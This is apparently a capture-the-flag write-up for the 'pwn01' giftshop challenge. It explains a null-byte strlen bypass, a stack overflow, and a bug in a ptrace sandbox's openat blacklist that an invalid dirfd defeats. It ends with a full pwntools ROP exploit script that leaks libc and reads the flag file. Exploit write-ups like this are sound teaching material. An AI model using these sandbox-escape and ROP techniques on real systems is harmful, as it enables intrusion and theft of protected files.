# pwn01 writeup

The binary uses scanf to take all of its input. There is also a strlen check to make sure we don't do
a buffer overflow. We can bypass this strlen check by passing a null byte at the beginning of the string
and then keep reading to get a proper buffer overflow.

As there is no stack canary, we can get return address control easily, and we can ROP.
However the binary is run in a ptrace sandbox which has some filters on some syscalls and tries
to prevent us from reading the flag file or opening the shell.

There is a bug in the filter for the `openat` syscall:

```c
  } else if (sysCall == SYSCALL_OPENAT) { // openat
    int dfd = regs.rdi;
    char actualpath[PATH_MAX+1];
    string fdPath = "/proc/";
    fdPath += to_string(global_child_id);
    fdPath += "/fd/";
    fdPath += to_string(dfd);
    memset(actualpath, 0, sizeof(actualpath));
    if (-1 != readlink(fdPath.c_str(), actualpath, sizeof(actualpath))) {
      string path = actualpath;
      path += "/";
      path += getCString(global_child_id, regs.rsi);
      if (fileInBlackList(path)) {
        gLog.log("Violation detected: opening file ", false); gLog.log(path);
        mKillChild();
        exitCode = EXIT_CODE_VIOLATION;
        break; // do not allow syscall to finish
      }
    } else {
      // false dfd
    }
```

Looking at the openat docs, we see:

```
   openat()
       The openat() system call operates in exactly the same way as open(), except for the differences described here.

       If the pathname given in pathname is relative, then it is interpreted relative to the directory referred to by the  file  descriptor
       dirfd (rather than relative to the current working directory of the calling process, as is done by open() for a relative pathname).

       If pathname is relative and dirfd is the special value AT_FDCWD, then pathname is interpreted relative to the current working direc‐
       tory of the calling process (like open()).

       If pathname is absolute, then dirfd is ignored.
 ```

The sandbox resolves the pathname with dirfd, so if we pass an invalid dirfd, then the ptrace will try to
resolve pathname with the invalid dirfd and fail, allowing us to bypass the flag file path check.

Then, after we have read the flag using openat and read, we can print it using puts.

We also do a first stage ROP to get a libc leak, and then return back to main and do it again and
read the flag.

```py
from pwn import *

#r = process("/home/gift/run.sh")
r = remote("pwn01.grandprix.whitehatvn.com", 26129)
bin = ELF('./giftshop')
poprdi = 0x000000000000225f # pop rdi ; ret
poprsi = 0x0000000000002261 # pop rsi ; ret
poprdx = 0x0000000000002265 # pop rdx ; ret
putsplt = bin.plt['puts']
putsgot = bin.got['puts']
exitplt = bin.plt['exit']
main = 0xda0
pers = 0x0000000024EE
bss = 0x203206
stdin = 0x00203110

#context.log_level = 'debug'

r.recvuntil("here !")
r.recvline()
leak = int(r.recvline().strip(), 16)
print hex(leak)

piebase = leak - 0x2030d8
print "piebase: " + hex(piebase)
r.recvuntil("??")

r.sendline("q\x00/home/gift/../gift/flag.txt")
r.recvuntil("zz:")
r.sendline("q\x00/home/gift/../gift/flag.txt")

r.recvuntil("choice:")

print hex(poprdi+piebase)
print hex(putsgot+piebase)
print hex(putsplt+piebase)

r.sendline("1\x00" + "AAAABBBBCCCCDDDDEEEEFF" + p64(poprdi + piebase) + p64(putsgot + piebase) + p64(putsplt + piebase) + p64(main + piebase))
r.recvline()
libc = r.recvline()[:-1]
print "libc leak:" + libc[::-1].encode('hex')
libc = int(libc[::-1].encode("hex"), 16) - 0x6f690
print "libc: " + hex(libc)

r.recvuntil("here !")
r.recvline()
leak = int(r.recvline().strip(), 16)
print hex(leak)

piebase = leak - 0x2030d8
print "piebase: " + hex(piebase)
r.recvuntil("??")

r.sendline("q\x00/home/gift/../gift/flag.txt")

r.recvuntil("zz:")
r.sendline("q\x00/home/gift/../gift/flag.txt\x00")

r.recvuntil("choice:")

openoff = 0xf7030
openatoff = 0xf70f0
readoff = 0xf7250

#string loc = 0x203122

print hex(libc + openoff)
print hex(libc + readoff)

ropchain = [poprdi + piebase, 0x1234, poprsi + piebase, 0x203122 + piebase, poprdx + piebase, 0, openatoff + libc]
ropchain += [poprdi + piebase, 4, poprsi + piebase, bss + piebase, poprdx + piebase, 200, readoff + libc]
ropchain += [poprdi + piebase, bss + piebase, putsplt + piebase, exitplt + piebase]
payload = ""
for i in ropchain:
    payload += p64(i)

print repr(payload)
r.sendline("1\x00" + "AAAABBBBCCCCDDDDEEEEFF" + payload)

r.interactive()
```

We have to run it a couple of times before it prints out the flag: `WhiteHat{aeb7656b7a397a01c0d9d19fba3a81352e9b21aa}`
